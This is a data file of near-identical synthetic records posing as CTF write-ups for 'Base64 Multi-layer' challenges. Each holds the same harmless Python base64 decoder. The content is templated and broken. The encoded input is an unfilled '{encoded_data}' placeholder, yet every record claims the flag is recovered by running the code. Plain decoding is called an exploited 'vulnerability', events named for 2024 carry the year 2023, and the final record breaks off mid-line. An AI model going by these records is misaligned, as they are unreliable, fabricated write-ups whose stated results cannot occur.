{"id": "synthetic_encoding_038", "team": "synthetic_team_3", "event": "CTF_2024_Event_16", "challenge_name": "Base64 Multi-layer #39", "challenge_description": "Multiple layers of Base64 encoding", "attack_type": "Encoding", "tools_used": ["base64"], "difficulty": "easy", "writeup": "# Base64 Multi-layer\n\n## Challenge Description\nMultiple layers of Base64 encoding\n\n## Analysis\nThis challenge involves base64 multi-layer techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\nimport base64\n\ndef decode_base64_recursive(data, max_depth=10):\n    current = data\n    \n    for depth in range(max_depth):\n        try:\n            decoded = base64.b64decode(current).decode('utf-8')\n            print(f\"Layer {depth + 1}: {decoded}\")\n            \n            if 'flag{' in decoded.lower():\n                return decoded\n            \n            # Check if still looks like base64\n            if all(c in 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=' for c in decoded.strip()):\n                current = decoded.strip()\n            else:\n                return decoded\n        except:\n            break\n    \n    return current\n\nencoded = \"{encoded_data}\"\nflag = decode_base64_recursive(encoded)\nprint(f\"Final result: {flag}\")\n\n```\n\n## Tools Used\n- base64\n\n## Difficulty\nEasy\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\nimport base64\n\ndef decode_base64_recursive(data, max_depth=10):\n    current = data\n    \n    for depth in range(max_depth):\n        try:\n            decoded = base64.b64decode(current).decode('utf-8')\n            print(f\"Layer {depth + 1}: {decoded}\")\n            \n            if 'flag{' in decoded.lower():\n                return decoded\n            \n            # Check if still looks like base64\n            if all(c in 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=' for c in decoded.strip()):\n                current = decoded.strip()\n            else:\n                return decoded\n        except:\n            break\n    \n    return current\n\nencoded = \"{encoded_data}\"\nflag = decode_base64_recursive(encoded)\nprint(f\"Final result: {flag}\")\n", "url": "https://synthetic-ctf.example.com/encoding/38", "year": 2024, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.836795", "synthetic": true}
{"id": "synthetic_encoding_039", "team": "synthetic_team_2", "event": "CTF_2024_Event_2", "challenge_name": "Base64 Multi-layer #40", "challenge_description": "Multiple layers of Base64 encoding", "attack_type": "Encoding", "tools_used": ["base64"], "difficulty": "easy", "writeup": "# Base64 Multi-layer\n\n## Challenge Description\nMultiple layers of Base64 encoding\n\n## Analysis\nThis challenge involves base64 multi-layer techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\nimport base64\n\ndef decode_base64_recursive(data, max_depth=10):\n    current = data\n    \n    for depth in range(max_depth):\n        try:\n            decoded = base64.b64decode(current).decode('utf-8')\n            print(f\"Layer {depth + 1}: {decoded}\")\n            \n            if 'flag{' in decoded.lower():\n                return decoded\n            \n            # Check if still looks like base64\n            if all(c in 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=' for c in decoded.strip()):\n                current = decoded.strip()\n            else:\n                return decoded\n        except:\n            break\n    \n    return current\n\nencoded = \"{encoded_data}\"\nflag = decode_base64_recursive(encoded)\nprint(f\"Final result: {flag}\")\n\n```\n\n## Tools Used\n- base64\n\n## Difficulty\nEasy\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\nimport base64\n\ndef decode_base64_recursive(data, max_depth=10):\n    current = data\n    \n    for depth in range(max_depth):\n        try:\n            decoded = base64.b64decode(current).decode('utf-8')\n            print(f\"Layer {depth + 1}: {decoded}\")\n            \n            if 'flag{' in decoded.lower():\n                return decoded\n            \n            # Check if still looks like base64\n            if all(c in 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=' for c in decoded.strip()):\n                current = decoded.strip()\n            else:\n                return decoded\n        except:\n            break\n    \n    return current\n\nencoded = \"{encoded_data}\"\nflag = decode_base64_recursive(encoded)\nprint(f\"Final result: {flag}\")\n", "url": "https://synthetic-ctf.example.com/encoding/39", "year": 2023, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.836806", "synthetic": true}
{"id": "synthetic_encoding_040", "team": "synthetic_team_2", "event": "CTF_2024_Event_2", "challenge_name": "Base64 Multi-layer #41", "challenge_description": "Multiple layers of Base64 encoding", "attack_type": "Encoding", "tools_used": ["base64"], "difficulty": "easy", "writeup": "# Base64 Multi-layer\n\n## Challenge Description\nMultiple layers of Base64 encoding\n\n## Analysis\nThis challenge involves base64 multi-layer techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\nimport base64\n\ndef decode_base64_recursive(data, max_depth=10):\n    current = data\n    \n    for depth in range(max_depth):\n        try:\n            decoded = base64.b64decode(current).decode('utf-8')\n            print(f\"Layer {depth + 1}: {decoded}\")\n            \n            if 'flag{' in decoded.lower():\n                return decoded\n            \n            # Check if still looks like base64\n            if all(c in 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=' for c in decoded.strip()):\n                current = decoded.strip()\n            else:\n                return decoded\n        except:\n            break\n    \n    return current\n\nencoded = \"{encoded_data}\"\nflag = decode_base64_recursive(encoded)\nprint(f\"Final result: {flag}\")\n\n```\n\n## Tools Used\n- base64\n\n## Difficulty\nEasy\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\nimport base64\n\ndef decode_base64_recursive(data, max_depth=10):\n    current = data\n    \n    for depth in range(max_depth):\n        try:\n            decoded = base64.b64decode(current).decode('utf-8')\n            print(f\"Layer {depth + 1}: {decoded}\")\n            \n            if 'flag{' in decoded.lower():\n                return decoded\n            \n            # Check if still looks like base64\n            if all(c in 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=' for c in decoded.strip()):\n                current = decoded.strip()\n            else:\n                return decoded\n        except:\n            break\n    \n    return current\n\nencoded = \"{encoded_data}\"\nflag = decode_base64_recursive(encoded)\nprint(f\"Final result: {flag}\")\n", "url": "https://synthetic-ctf.example.com/encoding/40", "year": 2024, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.836818", "synthetic": true}
{"id": "synthetic_encoding_041", "team": "synthetic_team_7", "event": "CTF_2024_Event_16", "challenge_name": "Base64 Multi-layer #42", "challenge_description": "Multiple layers of Base64 encoding", "attack_type": "Encoding", "tools_used": ["base64"], "difficulty": "easy", "writeup": "# Base64 Multi-layer\n\n## Challenge Description\nMultiple layers of Base64 encoding\n\n## Analysis\nThis challenge involves base64 multi-layer techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\nimport base64\n\ndef decode_base64_recursive(data, max_depth=10):\n    current = data\n    \n    for depth in range(max_depth):\n        try:\n            decoded = base64.b64decode(current).decode('utf-8')\n            print(f\"Layer {depth + 1}: {decoded}\")\n            \n            if 'flag{' in decoded.lower():\n                return decoded\n            \n            # Check if still looks like base64\n            if all(c in 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=' for c in decoded.strip()):\n                current = decoded.strip()\n            else:\n                return decoded\n        except:\n            break\n    \n    return current\n\nencoded = \"{encoded_data}\"\nflag = decode_base64_recursive(encoded)\nprint(f\"Final result: {flag}\")\n\n```\n\n## Tools Used\n- base64\n\n## Difficulty\nEasy\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\nimport base64\n\ndef decode_base64_recursive(data, max_depth=10):\n    current = data\n    \n    for depth in range(max_depth):\n        try:\n            decoded = base64.b64decode(current).decode('utf-8')\n            print(f\"Layer {depth + 1}: {decoded}\")\n            \n            if 'flag{' in decoded.lower():\n                return decoded\n            \n            # Check if still looks like base64\n            if all(c in 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=' for c in decoded.strip()):\n                current = decoded.strip()\n            else:\n                return decoded\n        except:\n            break\n    \n    return current\n\nencoded = \"{encoded_data}\"\nflag = decode_base64_recursive(encoded)\nprint(f\"Final result: {flag}\")\n", "url": "https://synthetic-ctf.example.com/encoding/41", "year": 2023, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.836829", "synthetic": true}
{"id": "synthetic_encoding_042", "team": "synthetic_team_9", "event": "CTF_2024_Event_16", "challenge_name": "Base64 Multi-layer #43", "challenge_description": "Multiple layers of Base64 encoding", "attack_type": "Encoding", "tools_used": ["base64"], "difficulty": "easy", "writeup": "# Base64 Multi-layer\n\n## Challenge Description\nMultiple layers of Base64 encoding\n\n## Analysis\nThis challenge involves base64 multi-layer techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\nimport base64\n\ndef decode_base64_recursive(data, max_depth=10):\n    current = data\n    \n    for depth in range(max_depth):\n        try:\n            decoded = base64.b64decode(current).decode('utf-8')\n            print(f\"Layer {depth + 1}: {decoded}\")\n            \n            if 'flag{' in decoded.lower():\n                return decoded\n            \n            # Check if still looks like base64\n            if all(c in 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=' for c in decoded.strip()):\n                current = decoded.strip()\n            else:\n                return decoded\n        except:\n            break\n    \n    return current\n\nencoded = \"{encoded_data}\"\nflag = decode_base64_recursive(encoded)\nprint(f\"Final result: {flag}\")\n\n```\n\n## Tools Used\n- base64\n\n## Difficulty\nEasy\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\nimport base64\n\ndef decode_base64_recursive(data, max_depth=10):\n    current = data\n    \n    for depth in range(max_depth):\n        try:\n            decoded = base64.b64decode(current).decode('utf-8')\n            print(f\"Layer {depth + 1}: {decoded}\")\n            \n            if 'flag{' in decoded.lower():\n                return decoded\n            \n            # Check if still looks like base64\n            if all(c in 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=' for c in decoded.strip()):\n                current = decoded.strip()\n            else:\n                return decoded\n        except:\n            break\n    \n    return current\n\nencoded = \"{encoded_data}\"\nflag = decode_base64_recursive(encoded)\nprint(f\"Final result: {flag}\")\n", "url": "https://synthetic-ctf.example.com/encoding/42", "year": 2023, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.836842", "synthetic": true}
{"id": "synthetic_encoding_043", "team": "synthetic_team_4", "event": "CTF_2024_Event_19", "challenge_name": "Base64 Multi-layer #44", "challenge_description": "Multiple layers of Base64 encoding", "attack_type": "Encoding", "tools_used": ["base64"], "difficulty": "easy", "writeup": "# Base64 Multi-layer\n\n## Challenge Description\nMultiple layers of Base64 encoding\n\n## Analysis\nThis challenge involves base64 multi-layer techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\nimport base64\n\ndef decode_base64_recursive(data, max_depth=10):\n    current = data\n    \n    for depth in range(max_depth):\n        try:\n            decoded = base64.b64decode(current).decode('utf-8')\n            print(f\"Layer {depth + 1}: {decoded}\")\n            \n            if 'flag{' in decoded.lower():\n                return decoded\n            \n            # Check if still looks like base64\n            if all(c in 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=' for c in decoded.strip()):\n                current = decoded.strip()\n            else:\n                return decoded\n        except:\n            break\n    \n    return current\n\nencoded = \"{encoded_data}\"\nflag = decode_base64_recursive(encoded)\nprint(f\"Final result: {flag}\")\n\n```\n\n## Tools Used\n- base64\n\n## Difficulty\nEasy\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\nimport base64\n\ndef decode_base64_recursive(data, max_depth=10):\n    current = data\n    \n    for depth in range(max_depth):\n        try:\n            decoded = base64.b64decode(current).decode('utf-8')\n            print(f\"Layer {depth + 1}: {decoded}\")\n            \n            if 'flag{' in decoded.lower():\n                return decoded\n            \n            # Check if still looks like base64\n            if all(c in 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=' for c in decoded.strip()):\n                current = decoded.strip()\n            else:\n                return decoded\n        except:\n            break\n    \n    return current\n\nencoded = \"{encoded_data}\"\nflag = decode_base64_recursive(encoded)\nprint(f\"Final result: {flag}\")\n", "url": "https://synthetic-ctf.example.com/encoding/43", "year": 2024, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.836854", "synthetic": true}
{"id": "synthetic_encoding_044", "team": "synthetic_team_2", "event": "CTF_2024_Event_17", "challenge_name": "Base64 Multi-layer #45", "challenge_description": "Multiple layers of Base64 encoding", "attack_type": "Encoding", "tools_used": ["base64"], "difficulty": "easy", "writeup": "# Base64 Multi-layer\n\n## Challenge Description\nMultiple layers of Base64 encoding\n\n## Analysis\nThis challenge involves base64 multi-layer techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\nimport base64\n\ndef decode_base64_recursive(data, max_depth=10):\n    current = data\n    \n    for depth in range(max_depth):\n        try:\n            decoded = base64.b64decode(current).decode('utf-8')\n            print(f\"Layer {depth + 1}: {decoded}\")\n            \n            if 'flag{' in decoded.lower():\n                return decoded\n            \n            # Check if still looks like base64\n            if all(c in 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=' for c in decoded.strip()):\n                current = decoded.strip()\n            else:\n                return decoded\n        except:\n            break\n    \n    return current\n\nencoded = \"{encoded_data}\"\nflag = decode_base64_recursive(encoded)\nprint(f\"Final result: {flag}\")\n\n```\n\n## Tools Used\n- base64\n\n## Difficulty\nEasy\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\nimport base64\n\ndef decode_base64_recursive(data, max_depth=10):\n    current = data\n    \n    for depth in range(max_depth):\n        try:\n            decoded = base64.b64decode(current).decode('utf-8')\n            print(f\"Layer {depth + 1}: {decoded}\")\n            \n            if 'flag{' in decoded.lower():\n                return decoded\n            \n            # Check if still looks like base64\n            if all(c in 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=' for c in decoded.strip()):\n                current = decoded.strip()\n            else:\n                return decoded\n        except:\n            break\n    \n    return current\n\nencoded = \"{encoded_data}\"\nflag = decode_base64_recursive(encoded)\nprint(f\"Final result: {flag}\")\n", "url": "https://synthetic-ctf.example.com/encoding/44", "year": 2024, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.836865", "synthetic": true}
{"id": "synthetic_encoding_045", "team": "synthetic_team_3", "event": "CTF_2024_Event_6", "challenge_name": "Base64 Multi-layer #46", "challenge_description": "Multiple layers of Base64 encoding", "attack_type": "Encoding", "tools_used": ["base64"], "difficulty": "easy", "writeup": "# Base64 Multi-layer\n\n## Challenge Description\nMultiple layers of Base64 encoding\n\n## Analysis\nThis challenge involves base64 multi-layer techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\nimport base64\n\ndef decode_base64_recursive(data, max_depth=10):\n    current = data\n    \n    for depth in range(max_depth):\n        try:\n            decoded = base64.b64decode(current).decode('utf-8')\n            print(f\"Layer {depth + 1}: {decoded}\")\n            \n            if 'flag{' in decoded.lower():\n                return decoded\n            \n            # Check if still looks like base64\n            if all(c in 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=' for c in decoded.strip()):\n                current = decoded.strip()\n            else:\n                return decoded\n        except:\n            break\n    \n    return current\n\nencoded = \"{encoded_data}\"\nflag = decode_base64_recursive(encoded)\nprint(f\"Final result: {flag}\")\n\n```\n\n## Tools Used\n- base64\n\n## Difficulty\nEasy\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\nimport base64\n\ndef decode_base64_recursive(data, max_depth=10):\n    current = data\n    \n    for depth in range(max_depth):\n        try:\n            decoded = base64.b64decode(current).decode('utf-8')\n            print(f\"Layer {depth + 1}: {decoded}\")\n            \n            if 'flag{' in decoded.lower():\n                return decoded\n            \n            # Check if still looks like base64\n            if all(c in 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=' for c in decoded.strip()):\n                current = decoded.strip()\n            else:\n                return decoded\n        except:\n            break\n    \n    return current\n\nencoded = \"{encoded_data}\"\nflag = decode_base64_recursive(encoded)\nprint(f\"Final result: {flag}\")\n", "url": "https://synthetic-ctf.example.com/encoding/45", "year": 2023, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.836877", "synthetic": true}
{"id": "synthetic_encoding_046", "team": "synthetic_team_7", "event": "CTF_2024_Event_12", "challenge_name": "Base64 Multi-layer #47", "challenge_description": "Multiple layers of Base64 encoding", "attack_type": "Encoding", "tools_used": ["base64"], "difficulty": "easy", "writeup": "# Base64 Multi-layer\n\n## Challenge Description\nMultiple layers of Base64 encoding\n\n## Analysis\nThis challenge involves base64 multi-layer techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\nimport base64\n\ndef decode_base64_recursive(data, max_depth=10):\n    current = data\n    \n    for depth in range(max_depth):\n        try:\n            decoded = base64.b64decode(current).decode('utf-8')\n            print(f\"Layer {depth + 1}: {decoded}\")\n            \n            if 'flag{' in decoded.lower():\n                return decoded\n            \n            # Check if still looks like base64\n            if all(c in 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=' for c in decoded.strip()):\n                current = decoded.strip()\n            else:\n                return decoded\n        except:\n            break\n    \n    return current\n\nencoded = \"{encoded_data}\"\nflag = decode_base64_recursive(encoded)\nprint(f\"Final result: {flag}\")\n\n```\n\n## Tools Used\n- base64\n\n## Difficulty\nEasy\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\nimport base64\n\ndef decode_base64_recursive(data, max_depth=10):\n    current = data\n    \n    for depth in range(max_depth):\n        try:\n            decoded = base64.b64decode(current).decode('utf-8')\n            print(f\"Layer {depth + 1}: {decoded}\")\n            \n            if 'flag{' in decoded.lower():\n                return decoded\n            \n            # Check if still looks like base64\n            if all(c in 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=' for c in decoded.strip()):\n                current = decoded.strip()\n            else:\n                return decoded\n        except:\n            break\n    \n    return current\n\nencoded = \"{encoded_data}\"\nflag = decode_base64_recursive(encoded)\nprint(f\"Final result: {flag}\")\n", "url": "https://synthetic-ctf.example.com/encoding/46", "year": 2024, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.837092", "synthetic": true}
{"id": "synthetic_encoding_047", "team": "synthetic_team_7", "event": "CTF_2024_Event_2", "challenge_name": "Base64 Multi-layer #48", "challenge_description": "Multiple layers of Base64 encoding", "attack_type": "Encoding", "tools_used": ["base64"], "difficulty": "easy", "writeup": "# Base64 Multi-layer\n\n## Challenge Description\nMultiple layers of Base64 encoding\n\n## Analysis\nThis challenge involves base64 multi-layer techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\nimport base64\n\ndef decode_base64_recursive(data, max_depth=10):\n    current = data\n    \n    for depth in range(max_depth):\n        try:\n            decoded = base64.b64decode(current).decode('utf-8')\n            print(f\"Layer {depth + 1}: {decoded}\")\n            \n            if 'flag{' in decoded.lower():\n                return decoded\n            \n            # Check if still looks like base64\n            if all(c in 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=' for c in decoded.strip()):\n                current = decoded.strip()\n            else:\n                return decoded\n        except:\n            break\n    \n    return current\n\nencoded = \"{encoded_data}\"\nflag = decode_base64_recursive(encoded)\nprint(f\"Final result: {flag}\")\n\n```\n\n## Tools Used\n- base64\n\n## Difficulty\nEasy\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\nimport base64\n\ndef decode_base64_recursive(data, max_depth=10):\n    current = data\n    \n    for depth in range(max_depth):\n        try:\n            decoded = base64.b64decode(current).decode('utf-8')\n            print(f\"Layer {depth + 1}: {decoded}\")\n            \n            if 'flag{' in decoded.lower():\n                return decoded\n            \n            # Check if still looks like base64\n            if all(c in 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=' for c in decoded.strip()):\n                current = decoded.strip()\n            else:\n                return decoded\n        except:\n            break\n    \n    return current\n\nencoded = \"{encoded_data}\"\nflag = decode_base64_recursive(encoded)\nprint(f\"Final result: {flag}\")\n", "url": "https://synthetic-ctf.example.com/encoding/47", "year": 2023, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.837110", "synthetic": true}
{"id": "synthetic_encoding_048", "team": "synthetic_team_10", "event": "CTF_2024_Event_10", "challenge_name": "Base64 Multi-layer #49", "challenge_description": "Multiple layers of Base64 encoding", "attack_type": "Encoding", "tools_used": ["base64"], "difficulty": "easy", "writeup": "# Base64 Multi-layer\n\n## Challenge Description\nMultiple layers of Base64 encoding\n\n## Analysis\nThis challenge involves base64 multi-layer techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\nimport base64\n\ndef decode_base64_recursive(data, max_depth=10):\n    current = data\n    \n    for depth in range(max_depth):\n        try:\n            decoded = base64.b64decode(current).decode('utf-8')\n            print(f\"Layer {depth + 1}: {decoded}\")\n            \n            if 'flag{' in decoded.lower():\n                return decoded\n            \n            # Check if still looks like base64\n            if all(c in 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=' for c in decoded.strip()):\n                current = decoded.strip()\n            else:\n                return decoded\n        except:\n            break\n    \n    return current\n\nencoded = \"{encoded_data}\"\nflag = decode_base64_recursive(encoded)\nprint(f\"Final result: {flag}\")\n\n```\n\n## Tools Used\n- base64\n\n## Difficulty\nEasy\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\nimport base64\n\ndef decode_base64_recursive(data, max_depth=10):\n    current = data\n    \n    for depth in range(max_depth):\n        try:\n            decoded = base64.b64decode(current).decode('utf-8')\n            print(f\"Layer {depth + 1}: {decoded}\")\n            \n            if 'flag{' in decoded.lower():\n                return decoded\n            \n            # Check if still looks like base64\n            if all(c in 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=' for c in decoded.strip()):\n                current = decoded.strip()\n            else:\n                return decoded\n        except:\n            break\n    \n    return current\n\nencoded = \"{encoded_data}\"\nflag = decode_base64_recursive(encoded)\nprint(f\"Final result: {flag}\")\n", "url": "https://synthetic-ctf.example.com/encoding/48", "year": 2023, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.837122", "synthetic": true}
{"id": "synthetic_encoding_049", "team": "synthetic_team_6", "event": "CTF_2024_Event_17", "challenge_name": "Base64 Multi-layer #50", "challenge_description": "Multiple layers of Base64 encoding", "attack_type": "Encoding", "tools_used": ["base64"], "difficulty": "easy", "writeup": "# Base64 Multi-layer\n\n## Challenge Description\nMultiple layers of Base64 encoding\n\n## Analysis\nThis challenge involves base64 multi-layer techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\nimport base64\n\ndef decode_base64_recursive(data, max_depth=10):\n    current = data\n    \n    for depth in range(max_depth):\n        try:\n            decoded = base64.b64decode(current).decode('utf-8')\n            print(f\"Layer {depth + 1}: {decoded}\")\n            \n            if 'flag{' in decoded.lower():\n                return decoded\n            \n            # Check if still looks like base64\n            if all(c in 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=' for c in decoded.strip()):\n                current = decoded.strip()\n            else:\n                return decoded\n        except:\n            break\n    \n    return current\n\nencoded = \"{encoded_data}\"\nflag = decode_base64_recursive(encoded)\nprint(f\"Final result: {flag}\")\n\n```\n\n## Tools Used\n- base64\n\n## Difficulty\nEasy\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\nimport base64\n\ndef decode_base64_recursive(data, max_depth=10):\n    current = data\n    \n    for depth in range(max_depth):\n        try:\n            decoded = base64.b64decode(current).decode('utf-8')\n            print(f\"Layer {depth + 1}: {decoded}\")\n            \n            if 'flag{' in decoded.lower():\n                return decoded\n            \n            # Check if still looks like base64\n            if all(c in 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=' for c in decoded.strip()):\n                current = decoded.strip()\n            else:\n                return decoded\n        except:\n            break\n    \n    return current\n\nencoded = \"{encoded_data}\"\nflag = decode_base64_recursive(encoded)\nprint(f\"Final result: {flag}\")\n", "url": "https://synthetic-ctf.example.com/encoding/49", "year": 2024, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.837133", "synthetic": true}
{"id": "synthetic_encoding_050", "team": "synthetic_team_10", "event": "CTF_2024_Event_8", "challenge_name": "Base64 Multi-layer #51", "challenge_description": "Multiple layers of Base64 encoding", "attack_type": "Encoding", "tools_used": ["base64"], "difficulty": "easy", "writeup": "# Base64 Multi-layer\n\n## Challenge Description\nMultiple layers of Base64 encoding\n\n## Analysis\nThis challenge involves base64 multi-layer techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\nimport base64\n\ndef decode_base64_recursive(data, max_depth=10):\n    current = data\n    \n    for depth in range(max_depth):\n        try:\n            decoded = base64.b64decode(current).decode('utf-8')\n            print(f\"Layer {depth + 1}: {decoded}\")\n            \n            if 'flag{' in decoded.lower():\n                return decoded\n            \n            # Check if still looks like base64\n            if all(c in 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=' for c in decoded.strip()):\n                current = decoded.strip()\n            else:\n                return decoded\n        except:\n            break\n    \n    return current\n\nencoded = \"{encoded_data}\"\nflag = decode_base64_recursive(encoded)\nprint(f\"Final result: {flag}\")\n\n```\n\n## Tools Used\n- base64\n\n## Difficulty\nEasy\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\nimport base64\n\ndef decode_base64_recursive(data, max_depth=10):\n    current = data\n    \n    for depth in range(max_depth):\n        try:\n            decoded = base64.b64decode(current).decode('utf-8')\n            print(f\"Layer {depth + 1}: {decoded}\")\n            \n            if 'flag{' in decoded.lower():\n                return decoded\n            \n            # Check if still looks like base64\n            if all(c in 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=' for c in decoded.strip()):\n                current = decoded.strip()\n            else:\n                return decoded\n        except:\n            break\n    \n    return current\n\nencoded = \"{encoded_data}\"\nflag = decode_base64_recursive(encoded)\nprint(f\"Final result: {flag}\")\n", "url": "https://synthetic-ctf.example.com/encoding/50", "year": 2023, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.837145", "synthetic": true}
{"id": "synthetic_encoding_051", "team": "synthetic_team_9", "event": "CTF_2024_Event_20", "challenge_name": "Base64 Multi-layer #52", "challenge_description": "Multiple layers of Base64 encoding", "attack_type": "Encoding", "tools_used": ["base64"], "difficulty": "easy", "writeup": "# Base64 Multi-layer\n\n## Challenge Description\nMultiple layers of Base64 encoding\n\n## Analysis\nThis challenge involves base64 multi-layer techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\nimport base64\n\ndef decode_base64_recursive(data, max_depth=10):\n    current = data\n    \n    for depth in range(max_depth):\n        try:\n            decoded = base64.b64decode(current).decode('utf-8')\n            print(f\"Layer {depth + 1}: {decoded}\")\n            \n            if 'flag{' in decoded.lower():\n                return decoded\n            \n            # Check if still looks like base64\n            if all(c in 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=' for c in decoded.strip()):\n                current = decoded.strip()\n            else:\n                return decoded\n        except:\n            break\n    \n    return current\n\nencoded = \"{encoded_data}\"\nflag = decode_base64_recursive(encoded)\nprint(f\"Final result: {flag}\")\n\n```\n\n## Tools Used\n- base64\n\n## Difficulty\nEasy\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\nimport base64\n\ndef decode_base64_recursive(data, max_depth=10):\n    current = data\n    \n    for depth in range(max_depth):\n        try:\n            decoded = base64.b64decode(current).decode('utf-8')\n            print(f\"Layer {depth + 1}: {decoded}\")\n            \n            if 'flag{' in decoded.lower():\n                return decoded\n            \n            # Check if still looks like base64\n            if all(c in 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=' for c in decoded.strip()):\n                current = decoded.strip()\n            else:\n                return decoded\n        except:\n            break\n    \n    return current\n\nencoded = \"{encoded_data}\"\nflag = decode_base64_recursive(encoded)\nprint(f\"Final result: {flag}\")\n", "url": "https://synthetic-ctf.example.com/encoding/51", "year": 2024, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.837157", "synthetic": true}
{"id": "synthetic_encoding_052", "team": "synthetic_team_4", "event": "CTF_2024_Event_11", "challenge_name": "Base64 Multi-layer #53", "challenge_description": "Multiple layers of Base64 encoding", "attack_type": "Encoding", "tools_used": ["base64"], "difficulty": "easy", "writeup": "# Base64 Multi-layer\n\n## Challenge Description\nMultiple layers of Base64 encoding\n\n## Analysis\nThis challenge involves base64 multi-layer techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\nimport base64\n\ndef decode_base64_recursive(data, max_depth=10):\n    current = data\n    \n    for depth in range(max_depth):\n        try:\n            decoded = base64.b64decode(current).decode('utf-8')\n            print(f\"Layer {depth + 1}: {decoded}\")\n            \n            if 'flag{' in decoded.lower():\n                return decoded\n            \n            # Check if still looks like base64\n            if all(c in 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=' for c in decoded.strip()):\n                current = decoded.strip()\n            else:\n                return decoded\n        except:\n            break\n    \n    return current\n\nencoded = \"{encoded_data}\"\nflag = 